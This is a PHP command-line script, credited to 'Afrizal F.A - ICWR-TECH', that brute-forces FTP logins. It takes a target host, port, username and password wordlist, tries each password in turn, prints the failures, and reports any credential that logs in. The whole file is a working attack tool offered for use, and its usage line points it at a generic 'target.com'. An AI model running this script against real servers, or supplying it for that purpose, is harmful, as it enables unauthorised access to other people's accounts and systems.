<?php
// Coded By Afrizal F.A //
// Copyright ©2019 - Afrizal F.A
error_reporting(0);
if(!empty($argv[1]) && !empty($argv[2]) && !empty($argv[3])) {
$host=$argv[1];
$port=$argv[2];
$user=$argv[3];
$list=file_get_contents($argv[4]);
$pass=explode("\n", $list);
echo "\n";
echo "####################################\n";
echo "#                                  #\n";
echo "# Coded By Afrizal F.A - ICWR-TECH #\n";
echo "#                                  #\n";
echo "####################################\n";
echo "\nHost => $host";
echo "\nPort => $port";
echo "\nUsername => $user";
echo "\nWordlist => $argv[4]\n";
echo "\nAttempt : \n\n";
foreach($pass as $pw) {
if(!empty($pw)) {
$ftp = ftp_connect($host,$port,1);
if(ftp_login($ftp,  $user,  $pw)) {
$res = "Username : $user | Password : $pw => True\n";
ftp_close($ftp);
break;
} else {
  echo "Password : $pw => False\n";
  ftp_close($ftp);
}
} else {
  continue;
}
}
} else {
  echo "\nphp $argv[0] target.com 21 username listpassword.txt\n
  ";
  ftp_close($ftp);
}
echo "\nResult : \n\n";
if(!empty($res)) {
echo "$res";
} else {
  echo "Not Find :(\n";
}
echo "\n";
//----------------------//
?>
